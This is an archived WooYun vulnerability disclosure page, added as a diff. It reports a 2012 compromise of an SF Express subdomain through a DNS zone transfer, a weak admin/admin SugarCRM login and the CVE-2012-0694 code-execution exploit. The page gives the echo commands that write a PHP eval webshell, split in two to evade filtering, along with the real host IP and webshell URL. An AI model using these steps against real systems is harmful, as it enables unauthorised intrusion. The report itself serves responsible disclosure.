@@ -1,0 +1,273 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		顺丰速运某分站PHP代码执行  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		顺丰速运某分站PHP代码执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/an1k3r">an1k3r</a> 
+</li><li>提交时间：		2012-07-05 09:12</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-05：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-07-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-07-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-07-25：	细节向普通白帽子公开<br/>
+									2012-08-04：	细节向实习白帽子公开<br/>
+									2012-08-19：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">其实是漏洞合集啊，包括PHP代码执行，信息泄漏等，导致拿到WebShell。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. DNS域传送漏洞<br />
+<br />
+</p><p class="detail"><a href="../images/0504174386f81bd56571261a4bd9f90593417638.png" target="_blank"><img src="../images/0504174386f81bd56571261a4bd9f90593417638.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. PHP代码执行漏洞<br />
+<br />
+把整理出来的IP扔到NMAP里，找到了一些有风险的系统。<br />
+<br />
+地址：http://219.134.187.130:8085/index.php?module=Users&amp;action=Login<br />
+<br />
+弱口令admin/admin进入后台。<br />
+<br />
+</p><p class="detail"><a href="../images/05042038b9a37cfd9e895d18f63deefaa683c146.png" target="_blank"><img src="../images/05042038b9a37cfd9e895d18f63deefaa683c146.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+进入系统之后发现SugarCRM版本是6.2.3,刚好用上最近的一个Exploit（需用户认证）。<br />
+<br />
+CVE编号：CVE-2012-0694       SugarCRM CE &lt;= 6.3.1 &quot;unserialize()&quot; PHP Code Execution<br />
+<br />
+<br />
+<br />
+于是拿到反弹shell。<br />
+<br />
+</p><p class="detail"><a href="../images/05042549ae45cb89ee028f5ca3a340b3a39c2687.png" target="_blank"><img src="../images/05042549ae45cb89ee028f5ca3a340b3a39c2687.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+在拿到Webshell之前有个小插曲，发现wget命令不能使用，貌似是防火墙禁止服务器外联。不过touch命令可以使用，vi不能用，只能使用echo。于是创建一个1.php的文件，然后echo写入。<br />
+<br />
+</p><pre><code>touch 1.php<br />
+echo &quot;&lt;?php eval($_POST[cmd])?&gt;&quot; &gt;&gt; 1.php</code></pre><p class='detail'><br />
+<br />
+但发现每次写入文件之后，$_POST都会被过滤掉，如下图。<br />
+<br />
+</p><p class="detail"><a href="../images/050429505ba4ce638ba47b0269ceb7be7da8562c.png" target="_blank"><img src="../images/050429505ba4ce638ba47b0269ceb7be7da8562c.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+于是想可不可以使用XSS的方法（跟gainover学的，参考了 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-07854">WooYun: 新浪微博某官方应用存储型XSS - 重温一个利用方法～</a> ，哈哈）分开写，<br />
+<br />
+于是第一行<br />
+<br />
+</p><pre><code>echo -n &quot;&lt;?php eval($&quot; &gt;&gt; 1.php</code></pre><p class='detail'><br />
+<br />
+第二行<br />
+<br />
+</p><pre><code>echo -n &quot;_POST[cmd])?&gt;&quot; &gt;&gt; 1.php</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/05043625cc647a3c723c59a5ee04d8d6c46b1007.png" target="_blank"><img src="../images/05043625cc647a3c723c59a5ee04d8d6c46b1007.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+然后用菜刀连上后上传Webshell。<br />
+<br />
+</p><p class="detail"><a href="../images/050437221c00f14997909f2444299ea8189b67a2.png" target="_blank"><img src="../images/050437221c00f14997909f2444299ea8189b67a2.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+Webshell地址  http://219.134.187.130:8085/shell.php <br />
+<br />
+暂未删除<br />
+<br />
+<br />
+<br />
+数据库信息<br />
+<br />
+</p><p class="detail"><a href="../images/0504443128d9818eb92fd3080548340241cb4ac1.png" target="_blank"><img src="../images/0504443128d9818eb92fd3080548340241cb4ac1.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+破解MD5后，进入招聘网站后台<br />
+<br />
+</p><p class="detail"><a href="../images/05044743e9d9c0811eaeb352c6985d1f38fb41fe.png" target="_blank"><img src="../images/05044743e9d9c0811eaeb352c6985d1f38fb41fe.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+3.信息泄漏，包括Oracle数据库的一些信息。<br />
+<br />
+http://uatmobile.sf-express.com/SFMobile.xml<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">都在详细说明里了。<br />
+<br />
+<br />
+<br />
+其它的系统都还好，像JBOSS，OpenFire等，该补的洞都补了，很多系统也升级到最新了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 修改SugarCRM口令。<br />
+<br />
+<br />
+<br />
+2. 删除http://uatmobile.sf-express.com/SFMobile.xml文件。<br />
+<br />
+<br />
+<br />
+3. 请删除测试时的Webshell  http://219.134.187.130:8085/shell.php<br />
+<br />
+<br />
+<br />
+4. 服务如果没有用就停掉，数据库和应用分离。<br />
+<br />
+<br />
+<br />
+礼物有没有？呵呵，貌似顺丰送礼物是不要快递费的。<br />
+<br />
+ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/an1k3r" title="an1k3r">an1k3r</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-09230" title="顺丰速运某分站PHP代码执行">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-07-05 09:43</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供，马上通知处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="9230";
+var bugRating="-3";
+var myRating="";
+var ratingCount="2";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
